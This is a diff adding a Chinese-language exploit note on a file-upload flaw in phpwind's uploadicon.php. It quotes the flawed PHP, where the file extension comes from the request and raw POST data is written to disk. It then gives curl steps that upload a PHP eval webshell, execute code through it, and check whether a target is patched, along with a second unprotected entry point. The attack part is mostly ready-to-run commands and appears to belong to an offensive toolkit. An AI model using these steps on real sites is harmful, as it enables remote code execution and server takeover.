@@ -1,0 +1,36 @@
+## 原理（源码逐行，本机审计 runs/pw-src/actions/job/uploadicon.php）
+
+```php
+// step 非空的 else 分支，第 23 行起
+$ext = strtolower(substr(strrchr($_GET['filename'], '.'), 1));   // ★ 扩展名取自 GET，本快照有白名单，早期版本无
+$udir = str_pad(substr($winduid, -2), 2, '0', STR_PAD_LEFT);
+/* if (!in_array(strtolower($ext), array('gif','jpg','jpeg','png','bmp'))) { Showmsg('undefined_action'); } */  // ★ 本次快照【已有】此白名单
+/* if (!file_exists($source)) { Showmsg('头像保存失败...'); } */                                                  // ★ “临时文件须已存在”检查【已被注释掉】
+$data = $_SERVER['HTTP_RAW_POST_DATA'] ? $_SERVER['HTTP_RAW_POST_DATA'] : file_get_contents('php://input');
+if ($data) {
+    $filename = "{$winduid}.$ext";                       // ★ 最终文件名 = 我的 uid + 我指定的扩展名
+    $middleFile = PwUpload::savePath($db_ifftp, $filename, "upload/middle/$udir/");
+    PwUpload::createFolder(dirname($middleFile));
+    writeover($middleFile, $data);                       // ★★ 把 POST 原始 body 逐字节写入（无图片内容校验）
+```
+
+## 利用步骤（先决条件：一个已登录的普通账号，可 register.php 自助注册）
+
+```bash
+# 1) 取 verify
+curl -s -c cookie.txt "http://TARGET/profile.php?action=modify&info_type=face" | grep -o 'verify=[0-9a-f]*'
+# 2) 写 PHP
+curl -s -b cookie.txt -H "Host: HOST" \
+  "http://TARGET/job.php?action=uploadicon&step=2&filename=x.php" \
+  --data-binary '<?php @eval($_POST[1]);?>'
+# 3) 验证
+curl -s -H "Host: HOST" "http://TARGET/upload/middle/XX/{uid}.php" -d "1=phpinfo();"
+```
+
+## 变体入口
+`u/require/profile/uploadicon.php:23` 同样是 `$ext = ...$_GET['filename']` 且**完全没有白名单**，
+但保留了 `if (!file_exists($source))`（需先存在 `{uid}_tmp.<ext>`）。
+
+## 判定
+- 无 `undefined_action` → 未打补丁，已写入 → 访问 upload/middle/xx/{uid}.php 验证 RCE
+- 返回 `undefined_action` → 已打白名单补丁 → 转其它 Upload 类（见 phpwind-87-arsenal/05）
